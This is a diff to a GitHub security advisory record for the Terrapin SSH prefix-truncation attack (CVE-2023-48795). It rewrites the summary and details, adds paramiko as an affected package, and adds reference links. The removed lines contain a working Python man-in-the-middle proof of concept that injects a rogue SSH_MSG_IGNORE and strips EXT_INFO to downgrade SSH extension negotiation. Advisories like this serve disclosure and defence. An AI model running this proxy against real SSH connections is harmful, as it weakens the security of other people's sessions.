@@ -1,13 +1,13 @@
 {
   "id": "GHSA-45x7-px36-x8w8",
-  "modified": "2023-12-18T21:41:26.618137Z",
+  "modified": "2023-12-19T22:12:47.902440Z",
   "published": "2023-12-18T19:22:09Z",
   "aliases": [
     "CVE-2023-48795",
     "GO-2023-2402"
   ],
-  "summary": "Russh vulnerable to Prefix Truncation Attack against ChaCha20-Poly1305 and Encrypt-then-MAC",
-  "details": "### Summary\n\nRussh v0.40.1 and earlier is vulnerable to a novel prefix truncation attack (a.k.a. Terrapin attack), which allows a man-in-the-middle attacker to strip an arbitrary number of messages right after the initial key exchange, breaking SSH extension negotiation (RFC8308) in the process and thus downgrading connection security.\n\n### Mitigations\n\nTo mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes. Support for strict key exchange has been added to Russh in the patched version. \n\n**Warning: To take effect, both the client and server must support this countermeasure.** \n\nAs a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.\n\n### Details\n\nThe SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.\n\nThe attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.\n\nIn the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.\n\nFor more details and a pre-print of the associated research paper, see [https://terrapin-attack.com](https://terrapin-attack.com). This website is not affiliated with Russh in any way.\n\n### PoC\n\n\u003cdetails\u003e\n  \u003csummary\u003eExtension Negotiation Downgrade Attack (chacha20-poly1305@openssh.com)\u003c/summary\u003e\n  \n  ```python\n#!/usr/bin/python3\nimport socket\nfrom binascii import unhexlify\nfrom threading import Thread\nfrom time import sleep\n\n#####################################################################################\n## Proof of Concept for the extension downgrade attack                             ##\n##                                                                                 ##\n## Variant: ChaCha20-Poly1305                                                      ##\n##                                                                                 ##\n## Client(s) tested: OpenSSH 9.5p1 / PuTTY 0.79                                    ##\n## Server(s) tested: OpenSSH 9.5p1                                                 ##\n##                                                                                 ##\n## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##\n#####################################################################################\n\n# IP and port for the TCP proxy to bind to\nPROXY_IP = '127.0.0.1'\nPROXY_PORT = 2222\n\n# IP and port of the server\nSERVER_IP = '127.0.0.1'\nSERVER_PORT = 22\n\nLENGTH_FIELD_LENGTH = 4\n\ndef pipe_socket_stream(in_socket, out_socket):\n    try:\n        while True:\n            data = in_socket.recv(4096)\n            if len(data) == 0:\n                break\n            out_socket.send(data)\n    except ConnectionResetError:\n        print(\"[!] Socket connection has been reset. Closing sockets.\")\n    except OSError:\n        print(\"[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.\")\n    in_socket.close()\n    out_socket.close()\n\nrogue_msg_ignore = unhexlify('0000000C060200000000000000000000')\ndef perform_attack(client_socket, server_socket):\n    # Version exchange\n    client_vex = client_socket.recv(255)\n    server_vex = server_socket.recv(255)\n    client_socket.send(server_vex)\n    server_socket.send(client_vex)\n    # SSH_MSG_KEXINIT\n    client_kexinit = client_socket.recv(35000)\n    server_kexinit = server_socket.recv(35000)\n    client_socket.send(server_kexinit)\n    server_socket.send(client_kexinit)\n    # Client will now send the key exchange INIT\n    client_kex_init = client_socket.recv(35000)\n    server_socket.send(client_kex_init)\n    # Insert ignore message (to client)\n    client_socket.send(rogue_msg_ignore)\n    # Wait half a second here to avoid missing EXT_INFO\n    # Can be solved by counting bytes as well\n    sleep(0.5)\n    # KEX_REPLY / NEW_KEYS / EXT_INFO\n    server_response = server_socket.recv(35000)\n    # Strip EXT_INFO before forwarding server_response to client\n    # Length fields of KEX_REPLY and NEW_KEYS are still unencrypted\n    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH])\n    server_newkeys_start = server_kex_reply_length\n    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH])\n    server_extinfo_start = server_newkeys_start + server_newkeys_length\n    client_socket.send(server_response[:server_extinfo_start])\n\nif __name__ == '__main__':\n    print(\"--- Proof of Concept for extension downgrade attack (ChaCha20-Poly1305) ---\")\n    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    mitm_socket.bind((PROXY_IP, PROXY_PORT))\n    mitm_socket.listen(5)\n\n    print(f\"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...\")\n    try:\n        while True:\n            client_socket, client_addr = mitm_socket.accept()\n            print(f\"[+] Accepted connection from: {client_addr}\")\n            print(f\"[+] Establishing new target connection to {(SERVER_IP, SERVER_PORT)}.\")\n            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            server_socket.connect((SERVER_IP, SERVER_PORT))\n            print(\"[+] Performing extension downgrade\")\n            perform_attack(client_socket, server_socket)\n            print(\"[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.\")\n            forward_client_to_server_thread = Thread(target=pipe_socket_stream, args=(client_socket, server_socket), daemon=True)\n            forward_client_to_server_thread.start()\n            forward_server_to_client_thread = Thread(target=pipe_socket_stream, args=(server_socket, client_socket), daemon=True)\n            forward_server_to_client_thread.start()\n    except KeyboardInterrupt:\n        client_socket.close()\n        server_socket.close()\n        mitm_socket.close()\n  ```\n\u003c/details\u003e\n\n### Impact\n\nThis attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.",
+  "summary": "Prefix Truncation Attack against ChaCha20-Poly1305 and Encrypt-then-MAC aka Terrapin",
+  "details": "### Summary\n\nTerrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.\n\n### Mitigations\n\nTo mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.\n\n**Warning: To take effect, both the client and server must support this countermeasure.** \n\nAs a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.\n\n### Details\n\nThe SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.\n\nThe attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.\n\nIn the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.\n\nFor more details see [https://terrapin-attack.com](https://terrapin-attack.com). \n\n### Impact\n\nThis attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.",
   "affected": [
     {
       "package": {
@@ -54,6 +54,175 @@
       "database_specific": {
         "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-45x7-px36-x8w8/GHSA-45x7-px36-x8w8.json"
       }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "paramiko",
+        "purl": "pkg:pypi/paramiko"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1-bulbasaur",
+        "0.1-charmander",
+        "0.9-doduo",
+        "0.9-eevee",
+        "0.9-fearow",
+        "0.9-gyarados",
+        "0.9-horsea",
+        "0.9-ivysaur",
+        "1.0",
+        "1.1",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.10.3",
+        "1.10.4",
+        "1.10.5",
+        "1.10.6",
+        "1.10.7",
+        "1.11.0",
+        "1.11.1",
+        "1.11.2",
+        "1.11.3",
+        "1.11.4",
+        "1.11.5",
+        "1.11.6",
+        "1.12.0",
+        "1.12.1",
+        "1.12.2",
+        "1.12.3",
+        "1.12.4",
+        "1.13.0",
+        "1.13.1",
+        "1.13.2",
+        "1.13.3",
+        "1.13.4",
+        "1.14.0",
+        "1.14.1",
+        "1.14.2",
+        "1.14.3",
+        "1.15.0",
+        "1.15.1",
+        "1.15.2",
+        "1.15.3",
+        "1.15.4",
+        "1.15.5",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.16.3",
+        "1.17.0",
+        "1.17.1",
+        "1.17.2",
+        "1.17.3",
+        "1.17.4",
+        "1.17.5",
+        "1.17.6",
+        "1.18.0",
+        "1.18.1",
+        "1.18.2",
+        "1.18.3",
+        "1.18.4",
+        "1.18.5",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.5.1",
+        "1.5.2",
+        "1.5.4",
+        "1.6",
+        "1.6.1",
+        "1.6.2",
+        "1.6.3",
+        "1.6.4",
+        "1.7",
+        "1.7.1",
+        "1.7.2",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7.1",
+        "1.7.7.2",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.12.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.5.0",
+        "2.5.1",
+        "2.6.0",
+        "2.7.0",
+        "2.7.1",
+        "2.7.2",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2",
+        "2.9.3",
+        "2.9.4",
+        "2.9.5",
+        "3.0.0",
+        "3.1.0",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-45x7-px36-x8w8/GHSA-45x7-px36-x8w8.json"
+      }
     }
   ],
   "references": [
@@ -75,6 +244,18 @@
     },
     {
       "type": "WEB",
+      "url": "https://github.com/proftpd/proftpd/issues/456"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/NixOS/nixpkgs/pull/275249"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/libssh2/libssh2/pull/1291"
+    },
+    {
+      "type": "WEB",
       "url": "https://github.com/mwiede/jsch/pull/461"
     },
     {
@@ -83,7 +264,19 @@
     },
     {
       "type": "WEB",
+      "url": "https://github.com/connectbot/sshlib/commit/5c8b534f6e97db7ac0e0e579331213aa25c173ab"
+    },
+    {
+      "type": "WEB",
       "url": "https://github.com/golang/crypto/commit/9d2ee975ef9fe627bf0a6f01c1f69e8ef1d4f05d"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jtesta/ssh-audit/commit/8e972c5e94b460379fe0c7d20209c16df81538a5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/mscdex/ssh2/commit/97b223f8891b96d6fc054df5ab1d5a1a545da2a3"
     },
     {
       "type": "WEB",
@@ -107,11 +300,27 @@
     },
     {
       "type": "WEB",
+      "url": "https://crates.io/crates/thrussh/versions"
+    },
+    {
+      "type": "WEB",
+      "url": "https://forum.netgate.com/topic/184941/terrapin-ssh-attack"
+    },
+    {
+      "type": "WEB",
       "url": "https://git.libssh.org/projects/libssh.git/commit/?h=stable-0.10\u0026id=10e09e273f69e149389b3e0e5d44b8c221c2e7f6"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/TeraTermProject/teraterm/releases/tag/v5.1"
     },
     {
       "type": "ADVISORY",
       "url": "https://github.com/advisories/GHSA-45x7-px36-x8w8"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/connectbot/sshlib/compare/2.2.21...2.2.22"
     },
     {
       "type": "WEB",
@@ -131,7 +340,19 @@
     },
     {
       "type": "WEB",
+      "url": "https://github.com/mwiede/jsch/compare/jsch-0.2.14...jsch-0.2.15"
+    },
+    {
+      "type": "WEB",
       "url": "https://github.com/openssh/openssh-portable/commits/master"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/proftpd/proftpd/blob/master/RELEASE_NOTES"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rapier1/hpn-ssh/releases"
     },
     {
       "type": "WEB",
@@ -179,11 +400,19 @@
     },
     {
       "type": "WEB",
+      "url": "https://nest.pijul.com/pijul/thrussh/changes/D6H7OWTTMHHX6BTB3B6MNBOBX2L66CBL4LGSEUSAI2MCRCJDQFRQC"
+    },
+    {
+      "type": "WEB",
       "url": "https://news.ycombinator.com/item?id=38684904"
     },
     {
       "type": "WEB",
       "url": "https://news.ycombinator.com/item?id=38685286"
+    },
+    {
+      "type": "WEB",
+      "url": "https://oryx-embedded.com/download/#changelog"
     },
     {
       "type": "WEB",
@@ -219,6 +448,14 @@
     },
     {
       "type": "WEB",
+      "url": "https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.netsarang.com/en/xshell-update-history/"
+    },
+    {
+      "type": "WEB",
       "url": "https://www.openssh.com/openbsd.html"
     },
     {
@@ -228,6 +465,10 @@
     {
       "type": "WEB",
       "url": "https://www.openwall.com/lists/oss-security/2023/12/18/2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.paramiko.org/changelog.html"
     },
     {
       "type": "WEB",
